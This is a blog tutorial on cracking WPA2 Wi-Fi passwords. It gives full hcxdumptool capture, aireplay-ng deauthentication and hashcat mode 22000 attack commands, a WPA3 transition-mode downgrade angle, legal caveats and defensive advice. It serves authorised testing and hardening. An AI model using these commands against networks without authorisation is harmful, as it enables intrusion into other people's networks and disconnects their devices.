+++
title = "How to crack Wi-Fi with hashcat in 2026"
date = 2026-07-03
slug = "hashcat-wifi-cracking-guide-2026"
description = "A practical, up-to-date walkthrough of cracking a WPA/WPA2 handshake with hashcat 7.1.2: capturing with hcxdumptool, converting to hash mode 22000, and running dictionary, rule-based, and mask attacks. Includes realistic GPU speeds and why WPA3-SAE stops this dead."

[taxonomies]
tags = ["hashcat", "wifi", "wpa2", "wpa3", "pmkid", "hcxdumptool", "password-cracking", "network-security", "security"]

[extra]
summary = "The airodump-ng + cap2hccapx workflow is dead; hcxdumptool + hashcat mode 22000 is the current standard. This walkthrough captures a PMKID and full 4-way handshake, converts to the unified hc22000 format, and runs dictionary, rule-based, and mask attacks against it — with real hashcat 7.1.2 syntax and 2026-era GPU speeds. Closes with why none of this touches a properly configured WPA3-SAE network."
faq = [
  { q = "Do I need to deauthenticate clients to capture a handshake in 2026?", a = "Less often than you used to. hcxdumptool captures the PMKID opportunistically from most access points with a single unencrypted frame — no client association or deauth needed at all. Deauth is now a fallback for the minority of APs that don't leak a PMKID and require a full 4-way handshake capture instead." },
  { q = "What's the difference between hashcat mode 22000 and the old modes 2500 / 16800?", a = "Modes 2500 (EAPOL) and 16800 (PMKID) are legacy, split-format modes tied to the old hccapx file format. Mode 22000 (WPA-PBKDF2-PMKID+EAPOL) is the current unified format produced by hcxpcapngtool — it handles both PMKID and full-handshake captures in one file and one hashcat invocation, and is what current tutorials and hcxtools target." },
  { q = "Can hashcat crack WPA3?", a = "Not via offline dictionary attack against a properly configured WPA3-Personal network. WPA3 replaces the PSK-derived handshake with SAE (Simultaneous Authentication of Equals), which doesn't leak a crackable hash to a passive observer — that's the whole point of the protocol. The only practical angle against WPA3 is forcing a downgrade on an access point still running WPA2/3 transition mode, then attacking the WPA2 side." },
  { q = "How fast can a modern GPU crack a WPA handshake?", a = "Mode 22000 uses PBKDF2 with 4096 iterations per candidate, which is intentionally expensive. A single RTX 5090-class GPU manages roughly 5–8 million candidates/second in 2026 — enough to exhaust rockyou.txt (14.3M entries) in under 3 seconds, but a random 12+ character PSK remains computationally out of reach for millennia." },
  { q = "Is this legal?", a = "Only against networks you own or have explicit written authorisation to test. Capturing and attempting to crack a handshake from a network you don't control is unauthorised access under most computer-crime laws, regardless of how trivial the technique is." }
]
+++

**TL;DR —** The `airodump-ng` + `aircrack-ng` + `cap2hccapx` pipeline that every 2015-era tutorial teaches is obsolete. The current workflow is **`hcxdumptool`** for capture, **`hcxpcapngtool`** to convert to the unified **hash mode 22000** format, and **`hashcat 7.1.2`** to attack it. This post walks through the full chain against a WPA2 network you're authorised to test, with real commands, realistic 2026 GPU speeds, and an honest answer for why none of it works against WPA3-SAE.

Only test networks you own or have explicit written authorisation to test. See [25 years of Wi-Fi security](/post/hack-wireless-network/) for the broader history and defensive guidance this walkthrough complements.

## What changed since the old tutorials

If you learned this from an old guide, three things are different now:

1. **`hcxdumptool`/`hcxtools` replaced `airodump-ng` + `cap2hccapx`** for capture and conversion. `aircrack-ng` is still fine for putting a card into monitor mode, but its own `.cap` capture format and the community `cap2hccapx` converter are legacy — they only produce the old, more limited hash modes.
2. **Hash mode 22000 replaced modes 2500 and 16800.** hashcat now has one unified format (`WPA-PBKDF2-PMKID+EAPOL`) that handles both a PMKID capture and a full 4-way handshake capture in the same file.
3. **PMKID-first, deauth-optional.** Most consumer APs leak a PMKID in a single frame with zero client interaction — no deauthenticating anyone required. Deauth is now a fallback, not the default first move.

## Requirements

- A wireless adapter that supports **monitor mode and packet injection** (Atheros AR9271 and Realtek RTL8812AU chipsets remain reliable choices in 2026).
- **hashcat 7.1.2** or later. `hashcat -V` to check; the project moves fast, update if you're behind.
- **hcxdumptool + hcxtools** (ZerBea's tools) — `apt install hcxdumptool hcxtools` on Debian/Kali, or build from source.
- A wordlist. See [rockyou.txt and the current state of wordlists](/post/rockyou-wordlist-history/) — start small (`rockyou-65.txt`), not with a 100 GB mega-list.
- A GPU. hashcat runs on CPU too, but WPA's PBKDF2 cost function is designed to be slow — a GPU is not optional if you want results in a reasonable time.

## Step 1 — monitor mode

```bash
sudo airmon-ng check kill      # stop NetworkManager/wpa_supplicant fighting for the interface
sudo airmon-ng start wlan0     # creates wlan0mon in monitor mode
```

Or without the aircrack-ng suite, using `iw` directly:

```bash
sudo ip link set wlan0 down
sudo iw wlan0 set monitor control
sudo ip link set wlan0 up
```

## Step 2 — capture with hcxdumptool

The opportunistic, no-deauth capture — grabs PMKIDs and handshakes from everything in range:

```bash
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
```

To target a specific BSSID and reduce noise, build a filter list and pass it in:

```bash
echo "AA:BB:CC:DD:EE:FF" > targets.txt
sudo hcxdumptool -i wlan0mon -o capture.pcapng \
  --filterlist=targets.txt --filtermode=2 --enable_status=1
```

If the target AP doesn't leak a PMKID and you need a full 4-way handshake from an associating client, force a reassociation with a classic deauth (requires authorisation — this affects the client's connection):

```bash
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
```

Let `hcxdumptool` keep running in another terminal while you do this — it captures the resulting handshake automatically.

## Step 3 — convert to hash mode 22000

```bash
hcxpcapngtool -o hash.22000 capture.pcapng
```

This single command extracts every crackable PMKID and EAPOL handshake found in the capture into hashcat's unified format. If you captured multiple networks and want to isolate one, filter the resulting file by BSSID (the second field in each line):

```bash
grep "aabbccddeeff" hash.22000 > target-only.22000
```

## Step 4 — attack it

### Dictionary attack

```bash
hashcat -m 22000 -a 0 hash.22000 rockyou-65.txt
```

Start with a small curated list, not the full 14.3M-entry `rockyou.txt` — see the [wordlist post](/post/rockyou-wordlist-history/) for why that's now the better default.

### Rule-based attack

Rules generate mutated candidates (case swaps, leetspeak, appended digits) from a small base list — usually far more effective per second of GPU time than a bigger unmutated list:

```bash
hashcat -m 22000 -a 0 -r rules/best64.rule hash.22000 rockyou-65.txt
```

### Mask attack

Useful when you know something about the PSK's structure — a common default-router pattern (8 digits), a phone-number-like PSK, or a known length:

```bash
hashcat -m 22000 -a 3 hash.22000 ?d?d?d?d?d?d?d?d
```

### Combinator attack

Concatenates two wordlists — useful for `word+word` or `word+number` PSK patterns:

```bash
hashcat -m 22000 -a 1 hash.22000 words.txt suffixes.txt
```

### Check results

```bash
hashcat -m 22000 hash.22000 --show
```

## Realistic speeds in 2026

Mode 22000 runs the PSK through **PBKDF2-HMAC-SHA1 with 4096 iterations** — this is by design, to make brute-force expensive. It's nowhere near as fast as a raw hash mode like NTLM or SHA-1.

| GPU class | Candidates/second (mode 22000) | `rockyou.txt` (14.3M) exhausted in |
|---|---:|---:|
| RTX 3090 (2022-era) | ~1.2M/s | ~12 s |
| RTX 4090 | ~2.5–3M/s | ~5 s |
| RTX 5090-class (2025+) | ~5–8M/s | ~2–3 s |
| 8× H100 cloud instance | ~50M/s aggregate | <0.3 s |

Against a **random 12+ character PSK** (entropy ≈ 2⁷²), none of these numbers matter — exhaustive search still takes millennia. Against an **8-character dictionary-word PSK**, all of them matter a great deal.

## Why this doesn't touch WPA3

Everything above targets **WPA2's PSK-derived 4-way handshake**, which by design lets an offline observer verify PSK guesses against a captured hash. **WPA3-Personal replaces this with SAE** (Simultaneous Authentication of Equals) — a protocol specifically built so that a passive capture doesn't yield anything crackable offline. There is no hashcat mode for "crack WPA3-SAE offline" because the protocol doesn't leak the material needed to try.

The practical angle against WPA3 in 2026 isn't cracking SAE — it's finding an access point still advertising **WPA2/3 transition mode**, forcing the client to negotiate the WPA2 side, and running exactly the attack above against that fallback. If the network is WPA3-only with PMF (Protected Management Frames) required, this playbook has nothing to offer. See [25 years of Wi-Fi security](/post/hack-wireless-network/) for the full picture, including the Dragonblood downgrade research this depends on.

## Defensive takeaway

If you're reading this to check your own network:

- **WPA3-Personal, no transition mode.** Check explicitly — many APs default to WPA2/3 mixed mode even when WPA3 is "enabled."
- **A long, random PSK** — 20+ characters, not a dictionary word or phone number. This is what actually stops every attack above cold, WPA2 or WPA3.
- **Disable WPS.** Unrelated to hashcat, but still commonly left on and still a much faster path in for an attacker.
- **PMF required, not optional**, to close off the deauth-driven handshake capture entirely.

> See also [rockyou.txt and the state of wordlists in 2026](/post/rockyou-wordlist-history/) for what to actually load into `-a 0`, and [25 years of Wi-Fi security](/post/hack-wireless-network/) for the protocol history behind all of this.
